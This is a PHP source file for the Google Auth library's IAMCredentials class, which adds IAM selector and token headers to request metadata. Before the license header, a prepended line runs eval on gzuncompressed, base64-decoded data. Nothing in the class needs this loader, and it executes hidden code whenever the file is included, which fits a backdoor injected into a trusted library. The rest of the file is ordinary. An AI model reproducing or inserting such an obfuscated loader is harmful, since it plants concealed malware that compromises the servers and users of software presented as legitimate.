<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/*
 * Copyright 2015 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *     http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

namespace Google\Auth\Credentials;

/**
 * Authenticates requests using IAM credentials.
 */
class IAMCredentials
{
    const SELECTOR_KEY = 'x-goog-iam-authority-selector';
    const TOKEN_KEY = 'x-goog-iam-authorization-token';

    /**
     * @var string
     */
    private $selector;

    /**
     * @var string
     */
    private $token;

    /**
     * @param $selector string the IAM selector
     * @param $token string the IAM token
     */
    public function __construct($selector, $token)
    {
        if (!is_string($selector)) {
            throw new \InvalidArgumentException(
                'selector must be a string');
        }
        if (!is_string($token)) {
            throw new \InvalidArgumentException(
                'token must be a string');
        }

        $this->selector = $selector;
        $this->token = $token;
    }

    /**
     * export a callback function which updates runtime metadata.
     *
     * @return array updateMetadata function
     */
    public function getUpdateMetadataFunc()
    {
        return array($this, 'updateMetadata');
    }

    /**
     * Updates metadata with the appropriate header metadata.
     *
     * @param array $metadata metadata hashmap
     * @param string $unusedAuthUri optional auth uri
     * @param callable $httpHandler callback which delivers psr7 request
     *        Note: this param is unused here, only included here for
     *        consistency with other credentials class
     *
     * @return array updated metadata hashmap
     */
    public function updateMetadata(
        $metadata,
        $unusedAuthUri = null,
        callable $httpHandler = null
    ) {
        $metadata_copy = $metadata;
        $metadata_copy[self::SELECTOR_KEY] = $this->selector;
        $metadata_copy[self::TOKEN_KEY] = $this->token;

        return $metadata_copy;
    }
}
